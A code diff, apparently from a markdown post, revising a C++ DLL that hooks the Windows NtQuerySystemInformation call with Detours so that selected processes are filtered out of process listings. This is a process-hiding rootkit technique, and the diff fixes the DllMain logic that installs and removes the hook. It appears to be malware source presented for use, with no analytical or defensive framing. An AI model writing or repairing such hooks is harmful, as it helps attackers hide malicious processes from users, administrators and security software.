@@ -100,7 +100,7 @@ typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
     ULONG SystemInformationLength,
     PULONG ReturnLength
 );
-static NtQuerySystemInformation_t _NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
+static NtQuerySystemInformation_t __NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
     GetModuleHandle(L"ntdll.dll"),
     "NtQuerySystemInformation"
 );
@@ -111,7 +111,7 @@ NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
     ULONG SystemInformationLength,
     PULONG ReturnLength
 ) {
-    NTSTATUS result = _NtQuerySystemInformation(
+    NTSTATUS result = __NtQuerySystemInformation(
         SystemInformationClass,
         SystemInformation,
         SystemInformationLength,
@@ -119,8 +119,8 @@ NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
     );
 
     if (SystemInformationClass == 5 && result == 0 && SystemInformation != nullptr) {
-        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
         PSYSTEM_PROCESS_INFORMATION prevInfo = nullptr;
+        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
         while (processInfo->NextEntryOffset || processInfo->UniqueProcessId) {
             bool hidden = false;
             if (processInfo->ImageName.Buffer != nullptr &&
@@ -153,22 +153,22 @@ BOOL APIENTRY DllMain( HMODULE hModule,
                        LPVOID lpReserved
                      )
 {
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourAttach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
-        DetourTransactionCommit();
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
+        DetourAttach(&(PVOID&)__NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
+
+        LONG error = DetourTransactionCommit();
+    }
+    else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
         DetourTransactionBegin();
         DetourUpdateThread(GetCurrentThread());
-        DetourDetach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
-        DetourTransactionCommit();
+        DetourDetach(&(PVOID&)__NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
+
+        LONG error = DetourTransactionCommit();
     }
     return TRUE;
+
 }
 ```
 
